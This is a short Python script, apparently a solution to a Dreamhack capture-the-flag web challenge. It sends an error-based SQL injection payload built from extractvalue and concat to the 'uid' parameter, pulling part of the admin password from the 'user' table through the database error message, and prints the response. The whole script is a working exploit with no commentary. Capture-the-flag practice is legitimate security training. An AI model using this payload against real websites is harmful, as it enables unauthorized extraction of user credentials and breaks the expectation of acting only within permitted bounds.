from requests import get

url = "http://host3.dreamhack.games:21630/"

query = f"admin' and extractvalue(1, concat(0x3a, (SELECT SUBSTR(concat(0x3a, upw), 20, 30) FROM user WHERE uid='admin')));"

r = get(f"{url}/?uid={query}")

print(r.text)
